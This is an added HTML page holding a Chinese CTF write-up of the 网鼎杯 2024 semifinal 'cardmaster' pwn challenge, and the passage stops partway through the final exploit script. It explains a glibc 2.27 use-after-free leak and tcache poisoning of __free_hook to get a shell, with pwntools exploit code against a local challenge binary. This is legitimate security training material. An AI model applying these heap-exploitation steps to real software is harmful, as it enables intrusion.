@@ -1,0 +1,813 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    网鼎杯 2024 半决赛 PWN | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="网鼎杯的题目决定先复现一道，cardmaster 这道题目总体来说是逆向难度比较大，指针比较乱，漏洞利用逻辑就是 glibc2.27 版本下的 UAF 和 teache_poisioning。另一道题目是一个内核题，决定再学习一段时间内核再去复现感觉效果会更好。  PWN1-cardmaster    看下初始化的一些基本信息： 先开辟 0x28 大小的空间，地址存放在 v4。再开辟 0x20 大">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯 2024 半决赛 PWN">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="网鼎杯的题目决定先复现一道，cardmaster 这道题目总体来说是逆向难度比较大，指针比较乱，漏洞利用逻辑就是 glibc2.27 版本下的 UAF 和 teache_poisioning。另一道题目是一个内核题，决定再学习一段时间内核再去复现感觉效果会更好。  PWN1-cardmaster    看下初始化的一些基本信息： 先开辟 0x28 大小的空间，地址存放在 v4。再开辟 0x20 大">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-001.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-002.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-003.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-004.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-005.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-006.png">
+<meta property="article:published_time" content="2026-08-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-27T09:59:31.406Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="网鼎杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-001.png">
+    <link rel="canonical" href="https://idcm-svg.github.io/HFTTC.github.io/2026/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn/">
+      <meta name="keywords" content="南阳理工学院, 网络安全, 软件安全, 计软, CTF, Pwn, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","name":"网鼎杯 2024 半决赛 PWN | HFTTC's Blog","headline":"网鼎杯 2024 半决赛 PWN","description":"心之所向，无问西东","url":"https://idcm-svg.github.io/HFTTC.github.io/2026/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn/","inLanguage":"zh-CN"}</script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">首页</span>
+          </a>
+          <div class="main-nav-dropdown-wrap">
+            <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog" aria-haspopup="true">
+                <div class="main-nav-icon icon rotate">
+                    &#xe62b;
+                </div>
+              <span class="main-nav-link">目录</span>
+            </a>
+            <div class="main-nav-dropdown-menu" role="menu">
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/basics" role="menuitem">基础知识</a>
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/catalog" role="menuitem">PWN知识集结</a>
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/catalog/#catalog-arm-pwn" role="menuitem">IOT</a>
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/catalog/#catalog-kernel-pwn" role="menuitem">Kernel</a>
+                  <div class="main-nav-dropdown-item has-children">
+                    <a class="main-nav-dropdown-link main-nav-dropdown-parent" href="/HFTTC.github.io/writeups" role="menuitem" aria-haspopup="true">比赛wp</a>
+                    <div class="main-nav-submenu" role="menu">
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn/" role="menuitem">网鼎杯 2024 半决赛</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%AE%81%E6%B3%A2%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91pwn-2026/" role="menuitem">第九届宁波市网络安全&amp;西湖论剑</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/17/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025-pwn/" role="menuitem">湾区杯</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/12/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202025-pwn/" role="menuitem">西湖论剑</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/10/%E9%BB%84%E9%B9%A4%E6%9D%AF2026-pwn/" role="menuitem">黄鹤杯</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/05/lexington-informatics-tournament-ctf-2026/" role="menuitem">Lexington Informatics Tournament CTF 2026</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/05/l3akctf2026/" role="menuitem">L3akCTF 2026</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/05/nepctf-2026-pwn/" role="menuitem">nepctf2026</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/06/19/SCTF2026%20slang/" role="menuitem">SCTF2026</a>
+                    </div>
+                  </div>
+            </div>
+          </div>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/notice">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">公告</span>
+          </a>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">友链</span>
+          </a>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">归档</span>
+          </a>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">关于</span>
+          </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/HFTTC.github.io/images/pwn/covers/wangdingbei-2024-semifinal-pwn.jpg" alt="网鼎杯 2024 半决赛 PWN">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">网鼎杯 2024 半决赛 PWN</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN1-cardmaster"><span class="toc-number">1.</span> <span class="toc-text">PWN1-cardmaster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">EXP 思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">147</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-网鼎杯2024半决赛pwn" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-26T16:00:00.000Z" itemprop="datePublished">2026-08-27</time>
+    <time style="display: none;" id="post-update-time">2026-08-27</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-08-27T09:59:31.406Z" itemprop="dateModified">2026-08-27</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>网鼎杯的题目决定先复现一道，cardmaster 这道题目总体来说是逆向难度比较大，指针比较乱，漏洞利用逻辑就是 glibc2.27 版本下的 UAF 和 teache_poisioning。另一道题目是一个内核题，决定再学习一段时间内核再去复现感觉效果会更好。</p>
+<hr>
+<h2 id="PWN1-cardmaster"><a href="#PWN1-cardmaster" class="headerlink" title="PWN1-cardmaster"></a>PWN1-cardmaster</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-001.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-002.png"></p>
+<p>看下初始化的一些基本信息：</p>
+<p>先开辟 0x28 大小的空间，地址存放在 v4。再开辟 0x20 大小的空间，地址存放在 v4[4]。</p>
+<p>可以把 v4[4] 看做一个链表，开辟一个 0xD0 大小的空间存放在 <code>v4[4]-&gt;v0</code>，之后可以把 v0 看做是一个二维数组：v0[i][j]，每个数组相当于是十六个字节的内存，前八个字节存放 i，后八个字节存放 j+1。</p>
+<p>根据题意我们大概得知这是一个扑克牌的项目，4 就代表四种不同的花色，13 就代表 “3-A” 中 13 种不同牌值。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-003.png"></p>
+<p>这里注意一下 <code>__isoc99_scanf(&quot;%lld&quot;, v4 + 2);</code>，<code>*((_UNKNOWN **)v4 + 2)</code>两处的不同。前者指的是 int 型的 v4，v4+2 指的就是+0x8；后者由于程序是 64 位的，默认 UNKNOWN 就是 8 个字节的指针数组，其 v4+2 指的是+0x10。(这道题目感觉就是指针给的太乱了)</p>
+<p>之后我们会进行 malloc&#x2F;realloc：不过在前面的分析当中，在第一次执行 set_info 时只会触发 malloc，在此之后在函数调用的最下方有这么几行代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 )</span><br><span class="line">&#123;</span><br><span class="line">    *((_QWORD *)v4 + <span class="number">2</span>) = v5;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new suite set:&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *((<span class="type">void</span> **)v4 + <span class="number">2</span>), <span class="number">4</span> * *v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他们会把我们会让指针指向 v5，把<code>*((_QWORD *)v4 + 2)</code>移到堆上，并读入内容，这样就会修改原本<code>*((_QWORD *)v4 + 2)</code> 存入的字符串，在第二次进入到 set_info 函数当中时就会触发 realloc。</p>
+<p>依据 realloc 的特性，执行 <code>realloc(*((void **)v4 + 2), 0);</code>就会导致 UAF，</p>
+<p>利用<code>(*(void (__fastcall **)(__int64))(v4 + 0x18))(v4);// get_info</code>我们可以执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_D31</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;suit count is %d\n&quot;</span>, *(_DWORD *)a1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;digit range: 1 - %d\n&quot;</span>, *(_DWORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;suit chara set:%s\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;randomize level:%lld\n&quot;</span>, *(_QWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行完<code>sub_D31</code>，原本指向<code>*((_QWORD *)v4 + 2)</code>的数据会被<code>*(const char **)(a1 + 16)</code>泄露，</p>
+<p>那么就可以通过这个泄露出 libc_base。</p>
+<p>最后利用 tcache_posioning 篡改 free_hook 进行 system(‘&#x2F;bin&#x2F;sh’);</p>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><p>利用 UAF 泄露 libc_base：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./cardmaster_patched&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./cardmaster_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.27.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">count, card_range, level, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;count&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(count).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;range&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(card_range).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;level&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(level).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">b&#x27;aaa&#x27;</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;set&quot;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_card</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">init_card()</span><br><span class="line">set_info(<span class="number">0x300</span>,<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">set_info(<span class="number">0x0</span>,<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">get_info()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;suit chara set:&quot;</span>)</span><br><span class="line">s = p.recv()</span><br><span class="line">log.success(<span class="string">f&#x27;leak_info is ==&gt;<span class="subst">&#123;s&#125;</span>&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-004.png"></p>
+<p>然后微调截取关键内容即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&quot;suit chara set:&quot;</span>)</span><br><span class="line">leak_info = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;leak_info is ==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak_info)&#125;</span>&#x27;</span>)</span><br><span class="line">libc_base = leak_info - <span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-005.png"></p>
+<p>之后利用 double_free 直接篡改 free_hook</p>
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./cardmaster_patched&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./cardmaster_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.27.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">count, card_range, level, content=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    